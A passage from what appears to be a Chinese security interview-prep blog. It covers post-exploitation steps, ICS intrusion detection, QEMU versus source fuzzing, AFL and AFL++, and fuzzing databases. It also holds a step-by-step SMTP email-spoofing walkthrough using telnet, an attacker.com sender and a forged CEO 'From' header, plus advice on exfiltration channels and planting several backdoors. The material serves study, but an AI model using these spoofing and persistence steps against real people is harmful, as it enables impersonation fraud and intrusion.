<li><strong>漏洞利用</strong>：针对新发现的主机和服务，利用已知的漏洞（如 MS17-010 永恒之蓝）进行横向渗透</li>
</ul>
<p><strong>4. 数据窃取与持久化</strong></p>
<p>渗透的最终目的通常是获取敏感数据</p>
<ul>
<li><strong>文件搜索</strong>：在主机上搜索敏感文件，如配置文件、数据库备份、Office 文档等，寻找密码、密钥或商业机密</li>
<li><strong>建立通道</strong>：建立一个隐蔽的数据传输通道，将窃取的数据传送到你的服务器</li>
<li><strong>植入后门</strong>：在成功渗透多台机器后，植入多个、不同类型的后门，以确保即使一个后门被发现，你仍有其他通道可以进入</li>
</ul>
<hr>
<h3 id="伪造电子邮件的原理"><a href="#伪造电子邮件的原理" class="headerlink" title="伪造电子邮件的原理"></a>伪造电子邮件的原理</h3><p><strong>1. SMTP 协议的漏洞</strong></p>
<p>SMTP 协议在设计之初，主要关注邮件的投递，而不是发件人的身份验证。它的工作方式非常简单：</p>
<ol>
<li><strong><code>HELO/EHLO</code></strong>：发送方（邮件客户端或服务器）向接收方（邮件服务器）发出问候，告知自己的域名</li>
<li><strong><code>MAIL FROM</code></strong>：发送方指定<strong>邮件的“信封发件人”</strong>，也就是邮件的实际投递地址</li>
<li><strong><code>RCPT TO</code></strong>：发送方指定收件人地址</li>
<li><strong><code>DATA</code></strong>：发送方发送邮件内容，包括邮件的**“信头”**（<code>From</code>、<code>To</code>、<code>Subject</code> 等）和邮件正文</li>
</ol>
<p><strong>漏洞所在</strong>：在 SMTP 协议中，<code>MAIL FROM</code> 和信头中的 <code>From</code> 地址是<strong>两个独立的字段</strong>，且 <strong>SMTP 服务器不会对这两者进行交叉验证</strong></p>
<ul>
<li><code>MAIL FROM</code>：用于邮件投递，类似于信封上的回邮地址</li>
<li><code>From</code>：用于显示给用户看，类似于信纸上的发件人</li>
</ul>
<p>攻击者可以轻松地在 <code>MAIL FROM</code> 中使用自己的地址，而在 <code>From</code> 字段中填写任何伪造的地址，例如 <code>ceo@yourcompany.com</code>。接收方邮件服务器只会检查 <code>MAIL FROM</code> 的合法性，而收件人看到的则是被伪造的 <code>From</code> 地址</p>
<p><strong>2. 伪造电子邮件的步骤</strong></p>
<p><strong>第一步：搭建邮件发送环境</strong></p>
<p>攻击者可以使用自己的服务器或第三方服务来发送邮件。最简单的方式是使用一个 Linux 服务器，通过 <strong>Telnet</strong> 或 <strong>Netcat</strong> 直接连接到目标邮件服务器的 <strong>25</strong> 端口，模拟 SMTP 协议的发送过程</p>
<p><strong>第二步：执行伪造命令</strong></p>
<p>攻击者在命令行中，按照 SMTP 协议的规范，输入以下命令：</p>
<ol>
<li><p><strong>连接邮件服务器</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet mailserver.targetdomain.com 25</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>问候</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HELO attacker.com</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>指定“信封发件人”</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAIL FROM:&lt;me@attacker.com&gt;</span><br></pre></td></tr></table></figure>

<p>这个地址通常是攻击者自己的，它只用于投递过程</p>
</li>
<li><p><strong>指定收件人</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RCPT TO:&lt;victim@targetdomain.com&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>发送邮件内容</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DATA</span><br></pre></td></tr></table></figure>

<p>服务器会回复一个 <code>354</code> 码，表示可以开始输入邮件内容</p>
</li>
<li><p><strong>伪造“信头”</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">From: &quot;CEO&quot; &lt;ceo@yourcompany.com&gt;</span><br><span class="line">To: &lt;victim@targetdomain.com&gt;</span><br><span class="line">Subject: Urgent Notice</span><br></pre></td></tr></table></figure>

<p>这里，<code>From</code> 字段被伪造成了 CEO 的地址，而收件人看到的就是这个伪造的地址</p>
</li>
<li><p><strong>发送正文</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;邮件正文内容&gt;</span><br><span class="line">.</span><br></pre></td></tr></table></figure>

<p>输入一个单独的 <code>.</code>，然后回车，表示邮件结束。服务器会回复 <code>250</code> 码，表示邮件已发送成功</p>
</li>
</ol>
<h1 id="27-二进制-系列"><a href="#27-二进制-系列" class="headerlink" title="27- 二进制 系列"></a>27- 二进制 系列</h1><h3 id="工控场景的入侵检测与普通场景入侵检测的区别"><a href="#工控场景的入侵检测与普通场景入侵检测的区别" class="headerlink" title="工控场景的入侵检测与普通场景入侵检测的区别"></a>工控场景的入侵检测与普通场景入侵检测的区别</h3><p><strong>1. 安全目标和优先级不同</strong></p>
<ul>
<li><strong>普通场景（IT）：</strong> IT 环境的核心安全目标通常是<strong>机密性、完整性和可用性（CIA）</strong>。其中，机密性往往是首要考虑的。这意味着保护数据不被泄露是头等大事，其次是确保数据不被篡改，最后是保障服务的持续运行。如果发生安全事件，系统可以短暂下线进行修复</li>
<li><strong>工控场景（ICS&#x2F;SCADA）：</strong> 工控环境的核心安全目标是<strong>可用性、完整性和机密性（AIC）</strong>。其首要任务是<strong>保障物理过程的持续运行和安全</strong>。任何中断都可能导致严重的物理后果，例如设备损坏、生产中断，甚至是人员伤亡和环境灾难。因此，可用性是压倒一切的。其次是确保控制命令的完整性，防止恶意篡改导致设备误操作。机密性（如生产配方）虽然重要，但优先级通常最低</li>
</ul>
<p><strong>2. 网络协议和通信方式不同</strong></p>
<ul>
<li><strong>普通场景（IT）：</strong> IT 网络主要使用标准、开放的协议，如 <strong>TCP&#x2F;IP、HTTP、HTTPS、SMTP、SSH</strong> 等。这些协议拥有成熟的加密、身份验证和安全机制，入侵检测系统（IDS）可以利用已知的签名库、异常行为模式和深度包检测（DPI）来分析流量</li>
<li><strong>工控场景（ICS&#x2F;SCADA）：</strong> 工控网络使用大量非标准的、专有的或特定领域的协议，如 <strong>Modbus、DNP3、Ethernet&#x2F;IP、PROFINET、OPC</strong> 等。这些协议最初设计时并未过多考虑安全性，通常是明文传输，缺乏加密和身份验证。因此，IT 领域的传统 IDS 无法理解和解析这些协议，更无法从中提取有用的信息。工控 IDS 必须具备对这些特定协议的深度解析能力</li>
</ul>
<p><strong>3. 系统架构和设备特性不同</strong></p>
<ul>
<li><strong>普通场景（IT）：</strong> IT 系统通常由服务器、PC、路由器、交换机等标准化硬件组成，更新和打补丁相对方便。架构灵活，通常有明确的边界和分层（如DMZ区）</li>
<li><strong>工控场景（ICS&#x2F;SCADA）：</strong> 工控系统由可编程逻辑控制器（PLC）、人机界面（HMI）、远程终端单元（RTU）、监控工作站等专用硬件组成。这些设备通常运行在实时操作系统上，计算能力和存储空间有限，<strong>打补丁和更新极为困难，甚至是不可能的</strong>，因为任何中断都可能影响生产。此外，工控网络通常是扁平的，设备之间直接通信，边界模糊</li>
</ul>
<p><strong>4. 攻击类型和检测方法不同</strong></p>
<ul>
<li><strong>普通场景（IT）：</strong> IT 攻击通常针对软件漏洞、弱密码、DDoS攻击、恶意软件、钓鱼邮件等。入侵检测系统主要依靠<strong>已知签名库（基于签名的检测）和行为模式分析（基于异常的检测）</strong>。例如，检测到特定的恶意代码特征码，或者发现异常的登录尝试次数</li>
<li><strong>工控场景（ICS&#x2F;SCADA）：</strong> 工控攻击不仅包括 IT 攻击手法（如针对监控工作站的恶意软件），更重要的是针对工控协议和物理过程的攻击。例如，<strong>恶意修改PLC的逻辑控制程序、篡改HMI上的数据显示、发送恶意的控制命令</strong>等。因此，工控IDS必须能够检测到：<ul>
<li><strong>异常的命令和参数：</strong> 例如，向PLC发送一个不属于正常操作范围的控制命令</li>
<li><strong>异常的过程值：</strong> 例如，传感器读数突然出现与物理常识不符的剧烈波动</li>
<li><strong>异常的通信模式：</strong> 例如，某个监控站突然向所有RTU发送大量广播包</li>
<li><strong>非法固件更新：</strong> 检测到对PLC或RTU的非法固件上传</li>
<li><strong>基于物理过程的异常检测：</strong> 结合物理过程的知识，判断网络流量是否会导致不合理的物理状态。例如，同时关闭两个互锁的阀门</li>
</ul>
</li>
</ul>
<p><strong>5. 部署方式和对系统的影响不同</strong></p>
<ul>
<li><strong>普通场景（IT）：</strong> IT IDS可以作为内联设备（inline）部署，直接串联在网络中，对流量进行阻断。或者作为旁路设备（out-of-band）部署，仅仅进行流量镜像分析。即使内联部署出现问题，通常也只会导致网络暂时中断，影响可控</li>
<li><strong>工控场景（ICS&#x2F;SCADA）：</strong> 工控 IDS 绝大多数情况下必须以**旁路（out-of-band）**方式部署。任何在关键通信路径上串联的设备都可能引入延迟，甚至导致网络通信中断，从而引发生产事故。因此，工控IDS通常通过交换机的镜像端口（SPAN）来复制和分析流量，只进行检测，不参与控制</li>
</ul>
<hr>
<h3 id="对比一下-QEMU-模式的-Fuzzing-和源码模式的-Fuzzing"><a href="#对比一下-QEMU-模式的-Fuzzing-和源码模式的-Fuzzing" class="headerlink" title="对比一下 QEMU 模式的 Fuzzing 和源码模式的 Fuzzing"></a>对比一下 QEMU 模式的 Fuzzing 和源码模式的 Fuzzing</h3><p><strong>1. 源码模式 Fuzzing</strong></p>
<p>源码模式 Fuzzing（也称为<strong>插桩式 Fuzzing</strong>）是在编译时对目标程序进行修改，插入额外的代码（即“插桩”）。这些桩点会在程序运行时收集代码覆盖率等信息，并反馈给 Fuzzer，指导其生成更有效的输入</p>
<p><strong>工作原理</strong></p>
<ul>
<li><strong>编译插桩</strong>：Fuzzer 使用专门的编译器前端（如 AFL-Clang 或 LLVM-sanitizer）来编译目标程序的源码</li>
<li><strong>插入探针</strong>：编译器会在每个基本块（Basic Block）的开头插入一个探针。当程序执行到一个新的基本块时，探针会向 Fuzzer 反馈这个信息</li>
<li><strong>反馈循环</strong>：Fuzzer 根据这些覆盖率信息，判断哪些输入探索了新的代码路径。它会保留这些有价值的输入，并对其进行变异，以期能找到更深层次的代码逻辑</li>
</ul>
<p><strong>优点</strong></p>
<ul>
<li><strong>高效</strong>：插桩非常轻量级，几乎不会引入额外的性能开销。Fuzzer 能够以极高的速度运行和测试样本，每秒可达数千甚至数万次</li>
<li><strong>精确的代码覆盖率</strong>：由于插桩在编译时完成，Fuzzer 能够获得非常精确的、基本块级别的代码覆盖率，这使得它能够更有效地探索代码路径</li>
<li><strong>直接定位崩溃点</strong>：由于 Fuzzer 能够知道输入触发了哪段代码，一旦发生崩溃，它能迅速定位到崩溃发生的基本块</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li><strong>需要源码</strong>：这是最大的局限性。如果目标程序是闭源的，你就无法使用这种方法</li>
<li><strong>编译复杂</strong>：对于复杂的项目，编译过程可能会很复杂，需要处理各种依赖和编译选项</li>
</ul>
<p><strong>2. QEMU 模式 Fuzzing</strong></p>
<p>QEMU 模式 Fuzzing（也称为<strong>黑盒或二进制 Fuzzing</strong>）是在<strong>二进制级别</strong>进行插桩和监控。它使用 QEMU 模拟器来运行目标程序，并通过修改 QEMU 的代码来收集代码覆盖率信息。</p>
<p><strong>工作原理</strong></p>
<ul>
<li><strong>二进制插桩</strong>：Fuzzer 启动一个修改过的 QEMU 用户模式模拟器</li>
<li><strong>动态翻译</strong>：QEMU 在运行目标程序时，会动态地将目标程序的机器码翻译成宿主机的机器码。在翻译过程中，Fuzzer 的插桩逻辑会被嵌入到生成的代码中</li>
<li><strong>收集覆盖率</strong>：当翻译后的代码执行时，插桩逻辑会收集代码覆盖率信息，并反馈给 Fuzzer。</li>
</ul>
<p><strong>优点</strong></p>
<ul>
<li><strong>无需源码</strong>：这是 QEMU 模式最大的优势。它能够 Fuzz 任何闭源的、可执行的二进制文件，这在分析恶意软件或商业软件时至关重要</li>
<li><strong>全系统覆盖</strong>：除了用户态程序，QEMU 还可以模拟整个系统。这意味着你可以用它来 Fuzz 驱动程序或内核</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li><strong>性能开销大</strong>：由于 QEMU 是一个模拟器，它会引入大量的性能开销。Fuzzing 速度比源码模式慢得多，通常每秒只能运行几十到几百次</li>
<li><strong>覆盖率信息粗糙</strong>：QEMU 模式通常只能提供基本块级别的覆盖率，但可能无法像源码模式那样精确地追踪到每一条指令的执行</li>
<li><strong>不稳定性</strong>：由于 QEMU 本身的复杂性，Fuzzing 过程中可能会出现一些不稳定的情况</li>
</ul>
<table>
<thead>
<tr>
<th>特性</th>
<th>源码模式 Fuzzing</th>
<th>QEMU 模式 Fuzzing</th>
</tr>
</thead>
<tbody><tr>
<td>是否需要源码</td>
<td>是</td>
<td>否</td>
</tr>
<tr>
<td>性能</td>
<td>极高（每秒数千次）</td>
<td>较低（每秒数十次）</td>
</tr>
<tr>
<td>代码覆盖率</td>
<td>非常精确（基本块级别）</td>
<td>较精确（基本块级别）</td>
</tr>
<tr>
<td>适用场景</td>
<td>开源项目、内部代码审计</td>
<td>闭源软件、恶意软件分析、驱动程序 Fuzzing</td>
</tr>
<tr>
<td>代表工具</td>
<td>AFL++、LibFuzzer</td>
<td>AFL-QEMU</td>
</tr>
</tbody></table>
<hr>
<h3 id="说说-QEMU-模式的动态插桩怎么实现的，有什么优缺点"><a href="#说说-QEMU-模式的动态插桩怎么实现的，有什么优缺点" class="headerlink" title="说说 QEMU 模式的动态插桩怎么实现的，有什么优缺点"></a>说说 QEMU 模式的动态插桩怎么实现的，有什么优缺点</h3><p><strong>QEMU 模式动态插桩的实现原理</strong></p>
<p>QEMU 本身是一个处理器模拟器，它通过**动态二进制翻译（Dynamic Binary Translation, DBT）**技术来执行不同架构的指令。这个过程为动态插桩提供了完美的切入点</p>
<p>简单来说，当 QEMU 运行一个目标程序时，它不是逐条解释执行指令，而是会：</p>
<ol>
<li><strong>读取指令块</strong>：QEMU 一次性读取一小段（通常是一个基本块）目标程序指令</li>
<li><strong>翻译并缓存</strong>：它将这些目标指令翻译成宿主机的机器码</li>
<li><strong>插入探针（Instrumentation）</strong>：在翻译过程中，QEMU 会在每个基本块的入口点<strong>注入额外的指令</strong>。这些额外的指令就是 Fuzzer 用来收集信息（如代码覆盖率）的探针</li>
<li><strong>执行翻译后的代码</strong>：QEMU 随后执行这段翻译并插桩后的代码</li>
</ol>
<p>整个过程就像一个<strong>即时编译器（JIT）</strong>。当一个基本块被执行时，QEMU 会检查其是否已被翻译。如果未翻译，就进行翻译、插桩和缓存；如果已翻译，就直接执行缓存中的代码</p>
<p>AFL-QEMU 就是利用这种机制。它修改了 QEMU 的源码，在翻译层增加了额外的逻辑。每当 QEMU 翻译一个基本块时，AFL-QEMU 就会插入代码，将该基本块的 ID 记录在一个共享内存区域中，从而让 Fuzzer 能够实时获取代码覆盖率信息</p>
<p><strong>优点</strong></p>
<ul>
<li><strong>无需源码</strong>：这是最大的优势。QEMU 模式在<strong>二进制级别</strong>工作，可以对任何闭源的、可执行的程序进行 Fuzzing，这对于分析商业软件、恶意软件以及驱动程序至关重要</li>
<li><strong>跨平台</strong>：QEMU 能够模拟不同的 CPU 架构（如 ARM、MIPS），这意味着你可以在一个 x86_64 的 Linux 机器上 Fuzz 一个 ARM 架构的程序</li>
<li><strong>全系统 Fuzzing</strong>：QEMU 可以模拟整个操作系统，包括内核。这使得它可以用于 Fuzzing 驱动程序和内核漏洞</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li><strong>性能开销大</strong>：动态二进制翻译本身就会带来显著的性能开销。Fuzzing 速度比源码插桩模式慢得多，通常每秒只能运行几十到几百次，而源码模式可以达到数万次</li>
<li><strong>覆盖率信息粗糙</strong>：QEMU 通常只能提供基本块级别的覆盖率，但无法像源码插桩那样精确地追踪到每一条指令的执行</li>
<li><strong>实现复杂且不稳定</strong>：QEMU 模拟器本身就非常复杂，在其中进行插桩会引入更多不确定性，有时会导致模拟过程不稳定或产生非预期的行为</li>
<li><strong>不适合处理 I&#x2F;O 密集型程序</strong>：对于那些需要频繁进行磁盘或网络 I&#x2F;O 的程序，QEMU 的模拟速度会变得更慢，Fuzzing 效率会大大降低</li>
</ul>
<hr>
<h3 id="fuzz-普通程序和数据库有哪些不同点"><a href="#fuzz-普通程序和数据库有哪些不同点" class="headerlink" title="fuzz 普通程序和数据库有哪些不同点"></a>fuzz 普通程序和数据库有哪些不同点</h3><p><strong>1. 输入和协议的复杂性</strong></p>
<ul>
<li><strong>普通程序</strong>：通常处理简单格式的输入，如文件、命令行参数或简单的网络数据包。这些输入的格式相对单一，fuzzer 很容易理解和变异。例如，对一个图片解析器进行fuzzing，输入就是图片文件</li>
<li><strong>数据库</strong>：数据库的输入是复杂的、有状态的网络协议和查询语言。fuzzer 需要理解和生成符合特定数据库协议（如 MySQL 的二进制协议、PostgreSQL 的文本协议）的数据包。更重要的是，数据库的**查询语言（SQL）**本身就极为复杂，包含多种数据类型、函数、联结操作和语法结构。fuzzer 不仅要生成畸形的协议数据，还要生成语法正确但语义畸形的 SQL 查询语句，比如超长的字符串、负数、特殊字符等</li>
</ul>
<p><strong>2. 状态管理和序列依赖</strong></p>
<ul>
<li><strong>普通程序</strong>：大多数普通程序是<strong>无状态</strong>的。每次运行fuzzer，程序都从一个干净的状态开始，处理一个单独的输入。这使得fuzzer很容易追踪和重现漏洞</li>
<li><strong>数据库</strong>：数据库是<strong>有状态</strong>的。一个查询的执行结果可能依赖于之前的查询。例如，你必须先创建一张表，然后才能向其中插入数据，最后才能查询。这意味着fuzzer需要生成一系列有逻辑关系的查询序列，而不是单个独立的输入。如果一个漏洞需要多次操作才能触发，fuzzer 必须能够管理和生成这个操作序列</li>
</ul>
<p><strong>3. 性能和效率</strong></p>
<ul>
<li><strong>普通程序</strong>：普通程序的fuzzing通常很快。一个文件解析器在毫秒级就能处理一个输入。这使得覆盖率引导的fuzzer（如 AFL）能够每秒测试数千甚至数万次，从而快速找到漏洞</li>
<li><strong>数据库</strong>：数据库的fuzzing通常很慢。每次建立连接、发送查询、接收响应都需要时间。此外，一个查询可能需要几毫秒甚至几秒来执行。这大大降低了fuzzer的测试速度，因此需要更智能的fuzzing策略</li>
</ul>
<p><strong>4. 漏洞类型和检测方法</strong></p>
<ul>
<li><strong>普通程序</strong>：fuzzing通常用于寻找内存安全漏洞，如缓冲区溢出、空指针解引用等。当程序崩溃时，fuzzer会立即捕获到异常</li>
<li><strong>数据库</strong>：数据库的漏洞类型更为多样，不仅包括内存安全问题，还包括：<ul>
<li><strong>逻辑漏洞</strong>：错误的查询结果、数据损坏等。这些漏洞不会导致程序崩溃，fuzzer需要有专门的逻辑来检测</li>
<li><strong>权限绕过</strong>：在低权限下执行高权限操作</li>
<li><strong>SQL 注入</strong>：这是一种特殊的逻辑漏洞，fuzzing可以用于寻找新的注入点</li>
</ul>
</li>
</ul>
<p>由于很多数据库漏洞不会导致程序崩溃，fuzzer需要额外的断言（assertions）或 Oracle 来检测。例如，fuzzer可以执行一个查询，然后用一个已知正确的查询来验证结果是否一致。如果不一致，就可能存在逻辑漏洞</p>
<p><strong>5. 架构和环境的复杂性</strong></p>
<ul>
<li><strong>普通程序</strong>：通常在一个单一进程中运行，fuzzer可以直接附加或作为子进程运行</li>
<li><strong>数据库</strong>：数据库是复杂的系统，通常是多进程或多线程的。这使得传统的fuzzer很难精确地追踪代码覆盖率。例如，一个主进程可能接受连接，然后派生出多个子进程来处理查询。fuzzer需要能够跟踪和监控这些子进程</li>
</ul>
<table>
<thead>
<tr>
<th>特性</th>
<th>Fuzzing 普通程序</th>
<th>Fuzzing 数据库</th>
</tr>
</thead>
<tbody><tr>
<td>输入</td>
<td>单一，通常是文件或简单网络数据</td>
<td>复杂，包含协议和查询语言</td>
</tr>
<tr>
<td>状态</td>
<td>无状态，每个输入独立</td>
<td>有状态，需要管理查询序列</td>
</tr>
<tr>
<td>速度</td>
<td>非常快，每秒数千次以上</td>
<td>较慢，受网络和查询执行速度影响</td>
</tr>
<tr>
<td>漏洞类型</td>
<td>主要是内存安全漏洞（崩溃）</td>
<td>内存安全、逻辑漏洞、权限问题等</td>
</tr>
<tr>
<td>检测方法</td>
<td>捕获崩溃</td>
<td>捕获崩溃，并需要断言或Oracle来检测非崩溃漏洞</td>
</tr>
<tr>
<td>挑战</td>
<td>探索代码路径和绕过输入验证</td>
<td>管理状态、生成复杂输入、处理低速和多进程环境</td>
</tr>
</tbody></table>
<hr>
<h3 id="说说-AFL-和-AFL-有哪些不同"><a href="#说说-AFL-和-AFL-有哪些不同" class="headerlink" title="说说 AFL++ 和 AFL 有哪些不同"></a>说说 AFL++ 和 AFL 有哪些不同</h3><p><strong>AFL (American Fuzzy Lop)</strong></p>
<p>首先，我们回顾一下 AFL。AFL 是由 Google 的 Michał Zalewski 开发的一款<strong>覆盖率引导的</strong>模糊测试工具，它开创了一个时代</p>
<ul>
<li><strong>核心思想：</strong> AFL 将模糊测试带入了一个新的高度，它不只是随机地变异输入，而是会<strong>监控程序的代码覆盖率</strong>。如果一个输入能让程序执行到之前未执行过的代码路径，AFL 就会认为这个输入“有价值”，并将其保存下来，然后基于这个输入进行更多的变异</li>
<li><strong>工作流程：</strong><ol>
<li>从一个种子文件（或一组种子文件）开始</li>
<li>对种子文件进行一系列的变异操作（如位翻转、字节插入、删除）</li>
<li>运行变异后的输入，同时监控代码覆盖率</li>
<li>如果发现新的代码路径，则将该输入加入到种子队列中，作为新的变异基础</li>
<li>如果程序崩溃，则保存导致崩溃的输入，作为漏洞报告</li>
</ol>
</li>
</ul>
<p>AFL 的出现，使得模糊测试的效率和深度得到了革命性的提升</p>
<p><strong>AFL++ (AFLplusplus)</strong></p>
<p>AFL++ 是在 AFL 的基础上发展起来的一个项目。它由一群顶尖的模糊测试研究人员和开发者维护，旨在<strong>整合所有 AFL 的优秀改进和新技术</strong></p>
<p>简而言之，<strong>AFL++ 是 AFL 的超集</strong>。它保留了 AFL 的核心思想和工作流程，但加入了大量的优化和新功能，使其在效率和能力上都远超原版 AFL</p>
<table>
<thead>
<tr>
<th>特性</th>
<th>AFL</th>
<th>AFL++</th>
</tr>
</thead>
<tbody><tr>
<td>模糊测试算法</td>
<td>基础的位翻转、字节插入、随机数等。</td>
<td>更丰富、更智能的变异算法。包括 CmpLog、Redqueen 等技术，能够智能地发现和变异比较指令的魔术字节。</td>
</tr>
<tr>
<td>覆盖率指导</td>
<td>基本的代码覆盖率指导。</td>
<td>更精细的覆盖率指导。通过 LTO、LLVM 和 GCC 等编译器插桩技术，可以获得更精确的覆盖率信息，甚至可以识别代码中的分支类型。</td>
</tr>
<tr>
<td>字典支持</td>
<td>有简单的字典支持。</td>
<td>更强大的字典支持。可以自动从目标程序中提取字典（例如文件头、关键词等），并通过字典来加速对复杂文件格式的理解。</td>
</tr>
<tr>
<td>代码插桩</td>
<td>基于 GCC 和 LLVM 的基本插桩。</td>
<td>多种插桩模式。除了编译器插桩，还支持 QEMU 模式的动态二进制插桩，可以对闭源程序进行模糊测试。</td>
</tr>
<tr>
<td>性能</td>
<td>优秀</td>
<td>卓越。通过代码优化和更智能的算法，其测试速度通常比原版 AFL 更快。</td>
</tr>
<tr>
<td>兼容性</td>
<td>仅支持 Linux 和部分 Unix-like 系统。</td>
<td>更好的兼容性。支持更多编译器、更多操作系统，并集成了更多的辅助工具。</td>
</tr>
</tbody></table>
<hr>
<h3 id="怎么给-AFL-做适配去-fuzz-数据库"><a href="#怎么给-AFL-做适配去-fuzz-数据库" class="headerlink" title="怎么给 AFL 做适配去 fuzz 数据库"></a>怎么给 AFL 做适配去 fuzz 数据库</h3><p><strong>适配器的核心任务</strong></p>
<p>这个适配器是一个程序，它将从 AFL 获取的<strong>文件输入</strong>转换成数据库能够理解的<strong>网络协议请求</strong>，然后发送给数据库</p>
<p>它的主要工作流程是：</p>
<ol>
<li>从标准输入（<code>stdin</code>）或文件中读取 AFL 提供的模糊数据</li>
<li>将这些数据解析成数据库协议的数据包或 SQL 查询语句</li>
<li>通过网络连接发送给数据库</li>
<li>监控数据库的响应，寻找崩溃或异常</li>
</ol>
<p><strong>两种常见的适配方案</strong></p>
<p>这里有两种常用的方案，它们各有优缺点。</p>
<p><strong>方案一：基于文件和本地连接的适配</strong></p>
<p>这是最简单的方案，适用于那些支持从文件加载数据的数据库</p>
<p><strong>实现步骤：</strong></p>
<ol>
<li><strong>编写适配器（<code>harness.c</code>）</strong>：<ul>
<li>适配器会创建一个本地的数据库连接</li>
<li>它从 AFL 的输入文件中读取数据，这些数据通常是<strong>SQL 语句</strong>或<strong>数据库协议数据</strong></li>
<li>适配器将读取到的内容作为 SQL 查询或协议数据发送给数据库</li>
</ul>
</li>
<li><strong>AFL 的运行方式</strong>：<ul>
<li>你需要用 AFL 的编译器（<code>afl-clang-fast</code>）编译这个适配器</li>
<li>AFL 启动后，它会变异种子文件中的 SQL 语句或协议数据</li>
<li>AFL 会不断地运行你的适配器，将变异后的数据通过 <code>stdin</code> 或文件喂给它</li>
<li>适配器在每次运行时，都会建立一个新的数据库连接，发送数据，然后退出</li>
</ul>
</li>
</ol>
<p><strong>优点：</strong></p>
<ul>
<li><strong>相对简单</strong>：易于实现，特别是当数据库有命令行客户端时</li>
<li><strong>高效率</strong>：避免了网络延迟，测试速度相对较快</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li><strong>不完整</strong>：只能测试数据库的查询解析部分，无法测试完整的网络协议栈</li>
<li><strong>状态问题</strong>：难以处理需要管理状态的查询序列。</li>
</ul>
<p><strong>方案二：基于网络和协议模拟的适配</strong></p>
<p>这是更复杂但更全面的方案，它能够真正地对数据库的网络协议层进行模糊测试</p>
<p><strong>实现步骤：</strong></p>
<ol>
<li><strong>使用 QEMU 模式</strong>：<ul>
<li>直接使用 <code>afl-fuzz -Q</code> 模式来对数据库服务器程序进行模糊测试</li>
<li>编写一个自定义的<strong>网络协议客户端</strong>作为适配器，它会向服务器发送数据，而不是从文件读取</li>
</ul>
</li>
<li><strong>创建“伪文件”</strong>：<ul>
<li>你需要一个外部程序（比如一个 Python 脚本）来生成包含数据库协议请求的“伪文件”</li>
<li>这个脚本会根据 AFL 提供的原始模糊数据，将其封装成完整的数据库协议数据包</li>
<li>AFL 会模糊这个“伪文件”</li>
</ul>
</li>
<li><strong>连接和发送</strong>：<ul>
<li>你的适配器会监听一个端口，当 AFL 的 QEMU 模式运行数据库服务器时，你的适配器会与其建立连接，并将模糊数据发送过去</li>
<li><strong>关键在于同步</strong>：你需要确保 AFL 的输入文件和你的适配器发送的数据包是一致的</li>
</ul>
</li>
</ol>
<p><strong>优点：</strong></p>
<ul>
<li><strong>全面</strong>：能够测试数据库的整个网络协议栈，包括身份验证、连接管理等</li>
<li><strong>真实</strong>：更接近实际的攻击场景</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li><strong>性能开销大</strong>：QEMU 模式本身就很慢，再加上网络延迟，模糊测试速度会非常低</li>
<li><strong>复杂</strong>：需要深入理解数据库的协议，并且需要处理网络连接、多进程&#x2F;多线程等问题</li>
</ul>
<hr>
<h3 id="介绍一下-fuzz-的流程，从选取目标开始"><a href="#介绍一下-fuzz-的流程，从选取目标开始" class="headerlink" title="介绍一下 fuzz 的流程，从选取目标开始"></a>介绍一下 fuzz 的流程，从选取目标开始</h3><p><strong>1. 选取目标</strong></p>
<p>Fuzzing 不是盲目的，你需要选择一个合适的、有价值的目标。好的目标通常具有以下特点：</p>
<ul>
<li><strong>处理复杂或不受信任的输入</strong>：比如文件解析器、网络协议栈、命令行参数处理程序。这些程序是攻击者的首要目标，因为它们直接暴露在外部输入之下</li>
<li><strong>高权限运行</strong>：如果一个程序以 <code>root</code> 或 <code>SYSTEM</code> 权限运行，它将是更具吸引力的攻击目标</li>
<li><strong>处理多种数据格式</strong>：例如，一个视频解码器需要处理各种容器格式（MP4, AVI）、编码格式（H.264, VP9）等</li>
<li><strong>有公开源码或已知的开源版本</strong>：如果你有源码，可以使用更高效的<strong>源码插桩</strong>（Source-based Instrumentation）模式，如 AFL++ 或 LibFuzzer。如果没有，则需要使用<strong>二进制插桩</strong>（Binary Instrumentation）模式，如 QEMU</li>
</ul>
<p><strong>2. 准备工作</strong></p>
<p>在开始模糊测试之前，需要做好充分的准备，这直接影响到 Fuzzing 的效率和成功率</p>
<ul>
<li><strong>获取种子文件（Seed Corpus）</strong>：种子文件是模糊测试的起点。你需要收集一批高质量的、能代表正常输入的样本文件。这些样本应该尽可能地覆盖程序的不同功能。高质量的种子文件能显著提高 Fuzzing 效率</li>
<li><strong>编译目标程序</strong>：如果是源码模式，你需要使用 Fuzzer 专用的编译器（例如 <code>afl-clang-fast</code>）来编译目标程序。这会在程序中植入探针，用于收集代码覆盖率信息</li>
<li><strong>创建 Fuzzing 脚本</strong>：你需要编写一个脚本，作为 Fuzzer 和目标程序之间的<strong>适配器（Harness）</strong>。这个脚本负责将 Fuzzer 生成的输入数据传递给目标程序。对于文件输入，适配器通常很简单，可能就是 <code>read()</code> 或 <code>fopen()</code> 函数。对于更复杂的网络协议，适配器需要解析并发送数据包</li>
<li><strong>配置 Fuzzer</strong>：根据你的目标和环境，你需要选择并配置一个合适的 Fuzzer（例如 AFL++）。配置参数包括：<ul>
<li>Fuzzing 模式（源码、QEMU、网络等）</li>
<li>Fuzzing 进程数量</li>
